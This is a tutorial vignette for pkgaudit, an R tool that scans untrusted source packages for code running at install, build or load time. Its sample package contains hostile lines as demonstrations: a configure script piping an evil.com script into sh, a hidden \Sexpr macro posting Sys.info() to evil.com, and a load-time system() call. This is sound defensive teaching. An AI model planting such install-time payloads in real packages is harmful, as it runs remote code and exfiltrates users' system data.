# Getting Started with pkgaudit

pkgaudit reports which parts of an R package can execute, when they
execute, and what they do, so that an untrusted package can be reviewed
before it is installed and loaded. It never executes the code it scans.

A finding is not an accusation. `configure` scripts and calls to system
tools, for example, are often legitimate. pkgaudit helps to identify
what deserves reviewer attention, not what is malicious.

``` r

library(pkgaudit)
```

## Example package

`untrustedpkg` is a small source package shipped with pkgaudit. It is
never built, checked, installed, or loaded; it exists only to be
scanned.

``` r

tarball <- system.file(
  "extdata", "untrustedpkg", "untrustedpkg_0.1.0.tar.gz",
  package = "pkgaudit"
)

exdir <- file.path(tempdir(), "untrustedpkg-example")
utils::untar(tarball, exdir = exdir)

pkg <- file.path(exdir, "untrustedpkg")
list.files(pkg, recursive = TRUE)
#> [1] "configure"         "DESCRIPTION"       "man/fetch_data.Rd"
#> [4] "R/fetch.R"         "R/zzz.R"
```

A `configure` script is a shell script that R runs when a package is
installed from source, before any of its R code is loaded:

    #!/bin/sh
    echo configuring
    curl -s https://www.evil.com/evil.sh | sh

`R/zzz.R` defines `.onLoad()`, a hook R calls when the namespace is
loaded:

    .onLoad <- function(libname, pkgname) {
      system("uname -a")
    }

`R/fetch.R` defines an ordinary function:

    fetch_data <- function(url) {
      download.file(url, tempfile())
    }

A help file can carry R code in two places that run at different times.
An `\examples{}` block runs under `R CMD check`. A `\Sexpr{}` macro runs
whenever the page is rendered, which includes `R CMD build` and
installation from source:

    \name{fetch_data}
    \alias{fetch_data}
    \title{Fetch Data From a URL}
    \description{
      Downloads the contents of \code{url} to a temporary file.
      \Sexpr[results=hide]{httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()))}
    }
    \usage{fetch_data(url)}
    \arguments{\item{url}{A URL to download.}}
    \examples{
    download.file("https://www.evil.com/data.csv", tempfile())
    }

The script that generates this package is in
[data-raw/create_untrustedpkg.R](https://github.com/tylerjssmith/pkgaudit/blob/main/data-raw/create_untrustedpkg.R).

## Auditing a package

[`audit_package()`](https://tylerjssmith.github.io/pkgaudit/reference/audit_package.md)
scans an unpacked source package. Printing the result gives the scan
metadata and the number of findings by category.

``` r

result <- audit_package(pkg)

print(result)
#> --- pkgaudit ----------------------------------------------------------------
#> Package:   untrustedpkg v0.1.0 (source directory)
#> Path:      /tmp/Rtmpk9A8y5/untrustedpkg-example/untrustedpkg
#> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
#> Scanned:   2026-08-24 04:33 UTC with pkgaudit v0.4.0, rules v0.4.0
#> 
#> File contexts:  1
#> Patterns:       4
#> Matches:        1
#> Errors:         0
```

[`summary()`](https://rdrr.io/r/base/summary.html) reports the findings
themselves: how often each rule matched, split by the lifecycle phase
the code runs in, with the MITRE ATT&CK techniques the rule carries.

``` r

summary(result)
#> --- pkgaudit Summary --------------------------------------------------------
#> Package:   untrustedpkg v0.1.0 (source directory)
#> Path:      /tmp/Rtmpk9A8y5/untrustedpkg-example/untrustedpkg
#> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
#> Scanned:   2026-08-24 04:33 UTC with pkgaudit v0.4.0, rules v0.4.0
#> 
#> --- R Patterns --------------------------------------------------------------
#> phase            rule            n   attck
#> at_build         httr            1   T1041
#> at_build         system          1   T1059.003 T1059.004
#> at_check         download_file   1   T1105
#> at_check         httr            1   T1041
#> at_check         system          1   T1059.003 T1059.004
#> at_install_src   httr            1   T1041
#> at_install_src   system          1   T1059.003 T1059.004
#> at_load          system          1   T1059.003 T1059.004
#> none             download_file   1   T1105
#> 
#> none: reported at no phase because nothing in the package was seen to call
#> it. Code under R/ is read this way by rule; a caller elsewhere, or a user,
#> can still reach it. See vignette("rules").
#> 
#> --- Shell / Make Matches ----------------------------------------------------
#> phase            rule            n   attck
#> at_build         curl            1   T1041 T1105
#> at_check         curl            1   T1041 T1105
#> at_install_src   curl            1   T1041 T1105
#> 
#> --- Coverage ----------------------------------------------------------------
#> status       top_level   type          files   lines
#> parsed       R/          R                 2       6
#> parsed       man/        Rd                1      12
#> matched      .           shell             1       3
#> unexamined   .           DESCRIPTION       1
#> 
#> --- Errors ------------------------------------------------------------------
#> No exceptions were raised.
```

Both methods accept `path = FALSE`, which omits the local filesystem
path. This matters when sharing results, since the path may reveal a
username or directory layout.

A `pkgaudit` object is a named list of ordinary data frames, plus scan
metadata, so findings can be filtered, joined and reported on directly.

``` r

names(result)
#> [1] "file_contexts" "patterns"      "matches"       "coverage"     
#> [5] "errors"        "metadata"
```

`patterns` holds security-relevant R calls, located by file, line and
column, and records the code context each one sits in. Every findings
frame also carries the rule’s `message`, its ATT&CK techniques, and one
logical column per lifecycle phase; those are omitted below to keep the
output readable.

``` r

result$patterns[, c("rule", "file_context", "line_number", "code_context",
                    "guarded", "indirect", "preview")]
#>            rule      file_context line_number     code_context guarded indirect
#> 1 download_file         R/fetch.R           2      in_function   FALSE    FALSE
#> 2        system           R/zzz.R           2      onLoad_base   FALSE    FALSE
#> 3 download_file man/fetch_data.Rd          11      Rd_examples   FALSE    FALSE
#> 4          httr man/fetch_data.Rd           6 Rd_Sexpr_install   FALSE    FALSE
#>                                                                       preview
#> 1                                              download.file(url, tempfile())
#> 2                                                          system("uname -a")
#> 3                  download.file("https://www.evil.com/data.csv", tempfile())
#> 4 httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()...
```

`matches` mirrors `patterns` but carries none of the three columns that
come from a parse tree – `code_context`, `guarded` and `indirect`. A
shell script has no R parse tree to sit in, so a match is located by
file and line alone.

``` r

result$matches[, c("rule", "file_context", "line_number", "preview")]
#>   rule file_context line_number                                   preview
#> 1 curl    configure           3 curl -s https://www.evil.com/evil.sh | sh
```

`coverage` accounts for the files themselves, recording what pkgaudit
made of each one: `parsed` for R, matched against its parse tree;
`matched` for shell and Make-like files, matched as text; `exportable`
for languages pkgaudit does not read, such as C and Python; `unexamined`
for files it did not read, such as serialized `.rda` and `.rds` objects;
and `error` where it tried to read a file and could not.

``` r

result$coverage[, c("file_context", "language", "status", "reason", "lines")]
#>        file_context language     status       reason lines
#> 1       DESCRIPTION     <NA> unexamined no_extractor    NA
#> 2         R/fetch.R        R     parsed         <NA>     3
#> 3           R/zzz.R        R     parsed         <NA>     3
#> 4         configure    shell    matched         <NA>     3
#> 5 man/fetch_data.Rd       Rd     parsed         <NA>    12
```

Coverage may not be complete. What the frame offers is not completeness
but legibility: a clean result can be checked rather than trusted,
because the scan says what it did not cover.

### Subsetting by phase

Every findings frame carries one logical column per lifecycle phase:
`at_autoconf`, `at_build`, `at_check`, `at_install_src`,
`at_install_bin`, `at_load`, `at_attach`, `at_unload`, `at_detach`. A
pattern inside an ordinary function is `FALSE` for all of them, since it
runs only if something calls it.

``` r

result$patterns[result$patterns$at_load,
                c("rule", "file_context", "code_context")]
#>     rule file_context code_context
#> 2 system      R/zzz.R  onLoad_base
```

[`summary()`](https://rdrr.io/r/base/summary.html) takes a `phase`
argument for the same purpose, including `"none"` for findings pkgaudit
could not attribute to any phase. Under `R/` that is code inside a
function definition, which the rules report as running nowhere because
`R/` is dominated by exported functions the lifecycle never calls. It is
not a claim that this package never calls them: pkgaudit does not trace
call graphs.

``` r

summary(result, phase = "at_load", path = FALSE)
#> --- pkgaudit Summary --------------------------------------------------------
#> Package:   untrustedpkg v0.1.0 (source directory)
#> SHA-256:   50be0a4fe9997cb47764c1eb2026be864242314a4af6dfd634e60a358dec8171
#> Scanned:   2026-08-24 04:33 UTC with pkgaudit v0.4.0, rules v0.4.0
#> Phases:    at_load
#> 
#> --- R Patterns --------------------------------------------------------------
#> phase     rule     n   attck
#> at_load   system   1   T1059.003 T1059.004
#> 
#> --- Shell / Make Matches ----------------------------------------------------
#> No matches were found.
#> 
#> --- Coverage ----------------------------------------------------------------
#> No files were found.
#> 
#> --- Errors ------------------------------------------------------------------
#> No exceptions were raised.
```

Phases overlap: building a package with vignettes also installs and
loads it, so one occurrence is counted under every phase it runs in.

## Reviewing findings

Two columns describe how code is *reached* rather than what it is, and
both bear on how much weight a finding deserves. `guarded` is `TRUE` for
code that ships but the lifecycle does not run, such as a `\dontrun{}`
block or a vignette chunk marked `eval=FALSE`. `indirect` is `TRUE`
where a call was made through the function’s name rather than the
function, as in `do.call("system", ...)`; the finding is reported under
the rule that owns the name, so filtering on `rule` finds every call to
it however it was spelled.

`untrustedpkg` returns five findings. Read in order of the phases they
run in, they escalate.

**[`download.file()`](https://rdrr.io/r/utils/download.file.html) in
`R/fetch.R` runs at no phase.** It sits in the body of `fetch_data()`,
so it executes only if a user calls that function. A package that
downloads a file when asked to download a file is doing its job. This is
the baseline: a capability, disclosed in an exported function.

**[`download.file()`](https://rdrr.io/r/utils/download.file.html) in
`man/fetch_data.Rd` runs under `R CMD check`.** The same call appears in
the `\examples{}` block, so checking the package fetches the URL.
Examples are meant to run, and a reviewer would weigh this as
documentation that reaches the network rather than as an attack.

**[`system()`](https://rdrr.io/r/base/system.html) in `R/zzz.R` runs on
[`library()`](https://rdrr.io/r/base/library.html).** `.onLoad()` is
called when the namespace loads, so `system("uname -a")` executes on
[`library()`](https://rdrr.io/r/base/library.html) – which loads before
it attaches – and again at build, check, and installation from source,
each of which loads the package. Nobody asked for it. The command itself
is reconnaissance rather than damage, but the capability is arbitrary
shell execution at load time.

**`curl` in `configure` runs at installation from source.** The script
pipes a remote script directly into a shell:

    #!/bin/sh
    echo configuring
    curl -s https://www.evil.com/evil.sh | sh

This executes before any R code is loaded, and what it executes is not
in the package: it is whatever the remote host serves at the moment of
installation. Nothing in the source says what will run.

**[`httr::POST()`](https://httr.r-lib.org/reference/POST.html) in
`man/fetch_data.Rd` runs when the help page is built, and is
invisible.** The call sits in a `\Sexpr[results=hide]{}` macro in the
`\description{}` block. `\Sexpr{}` is evaluated whenever the page is
rendered, during `R CMD build` and installation from source;
`results=hide` suppresses its output. A reader of `?fetch_data` sees a
one-line description and an example, and no sign that rendering the page
sent [`Sys.info()`](https://rdrr.io/r/base/Sys.info.html) to a remote
host.

``` r

result$patterns[result$patterns$code_context == "Rd_Sexpr_install",
                c("rule", "file_context", "line_number", "preview")]
#>   rule      file_context line_number
#> 4 httr man/fetch_data.Rd           6
#>                                                                       preview
#> 4 httr::POST("https://www.evil.com/collect", body = list(info = Sys.info()...
```

This is the finding that motivates scanning documentation as code. It
runs automatically, it exfiltrates, and it is invisible both to a user
reading the help page and to any scanner that reads only `.R` files.

A clean scan is weak evidence of safety. pkgaudit reasons about syntax,
so sufficiently indirect code can evade any pattern rule. A call whose
target is a string literal is followed – `do.call("system", ...)` is
reported as a `system` finding – but one assembled at runtime is not,
since pkgaudit evaluates nothing. Matches are weaker still, being
matched against text rather than a parse tree, so they both miss more
and flag more: a `curl` inside a comment is reported, and one assembled
from shell variables is not.

A scan with findings is better understood as a reading list than a
verdict. In review, the questions worth asking are roughly:

- Does the package need this capability at all, given what it claims to
  do?
- Does it run without being asked, at install or load time, rather than
  when a user calls a function?
- Does it reach the network, and if so, is the destination fixed and
  identifiable in the source?
- Is the code being run visible in the source, or is it assembled,
  decoded, or fetched at runtime?
- What did the scan not read, and does any of it run automatically?

Findings that answer badly on several of these at once are the ones to
read closely.

## Exporting findings

[`emit_sarif()`](https://tylerjssmith.github.io/pkgaudit/reference/emit_sarif.md)
renders a result as SARIF 2.1.0, the format code-scanning tools publish
results in. It returns the document as a string and writes nothing.

``` r

sarif <- emit_sarif(result)
substr(sarif, 1, 200)
#> {
#>   "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
#>   "version": "2.1.0",
#>   "runs": [
#>     {
#>       "tool": {
#>         "driver": {
#>           "name": "pkgaudit",
#>           "version": "0.4.0",
#> 
```

Written to a file and opened in an editor with a SARIF viewer, each
finding appears on the line it was found. Rule identifiers are
namespaced by the kind of rule – `pattern/curl`, `match/curl` – because
a rule name is unique only within its kind. `level` is `note` for every
result: pkgaudit does not rank findings, so nothing is mapped onto
SARIF’s severity field, and when a finding’s code executes is carried in
the result’s `properties.phases`.

[`export_unscanned()`](https://tylerjssmith.github.io/pkgaudit/reference/export_unscanned.md)
writes the code pkgaudit cannot read into a directory a scanner such as
Semgrep can be pointed at. A whole file is copied verbatim; a vignette
chunk in a language with no analyzer is written into a file of its own,
blank-padded so that its code sits at the same line numbers it occupies
in the source. A finding another tool reports at line 40 of
`intro.python.py` is therefore at line 40 of `intro.Rmd`.

`untrustedpkg` is R and shell throughout, so there is nothing to hand on
and the manifest comes back empty:

``` r

manifest <- export_unscanned(result, file.path(tempdir(), "for-semgrep"),
                             source = pkg)
nrow(manifest)
#> [1] 0
```

For a package carrying compiled code, each row of the manifest maps an
exported file back to where it came from. The directory has no default:
naming one is how the caller consents to being written to.

## Auditing a tarball

The more common workflow is to scan a package that has not been
installed.
[`audit_tarball()`](https://tylerjssmith.github.io/pkgaudit/reference/audit_tarball.md)
takes a `.tar.gz` source package, validates it, extracts it to a
temporary directory, scans it, and removes the directory. An untrusted
archive is itself an attack surface, so validation fails closed: the
whole archive is refused rather than partially extracted.

``` r

print(audit_tarball(tarball), path = FALSE)
#> --- pkgaudit ----------------------------------------------------------------
#> Package:   untrustedpkg v0.1.0 (source tarball)
#> SHA-256:   0c58ddcb365787ab7401c5eedaa4be7eb4ce6bea0a5ca290b6b7b1d8eb621d44
#> Scanned:   2026-08-24 04:33 UTC with pkgaudit v0.4.0, rules v0.4.0
#> 
#> File contexts:  1
#> Patterns:       4
#> Matches:        1
#> Errors:         0
```

The result is a `pkgaudit` object like any other, so everything above
applies to it unchanged.

## Rule database integrity

The rules live in a versioned SQLite database shipped with the package.
[`load_rules()`](https://tylerjssmith.github.io/pkgaudit/reference/load_rules.md)
reads it;
[`rules_version()`](https://tylerjssmith.github.io/pkgaudit/reference/rules_version.md)
reports the version.

``` r

rules_version()
#> [1] "0.4.0"

rules <- load_rules()
vapply(rules, nrow, integer(1))
#> file_contexts code_contexts      patterns       matches        phases 
#>            45            10            23            11            55
```

A modified database is one way to evade a scanner.
[`load_rules()`](https://tylerjssmith.github.io/pkgaudit/reference/load_rules.md)
verifies the database against its bundled SHA-256 sidecar on every call
and refuses to load a modified one. The hash of an installed copy can
also be checked against the value published in the
[README](https://github.com/tylerjssmith/pkgaudit#rule-database-integrity):

``` r

digest::digest(
  system.file("db", "rules.db", package = "pkgaudit"),
  algo = "sha256",
  file = TRUE
)
#> [1] "5fc1ec8e93232517679fb03df0f08020d844912e701615de7827666be2f6a7cd"
```

The full rule set is documented in [Rule
Coverage](https://tylerjssmith.github.io/pkgaudit/articles/rules.md).
How pkgaudit works internally is in
[Internals](https://tylerjssmith.github.io/pkgaudit/articles/internals.md).
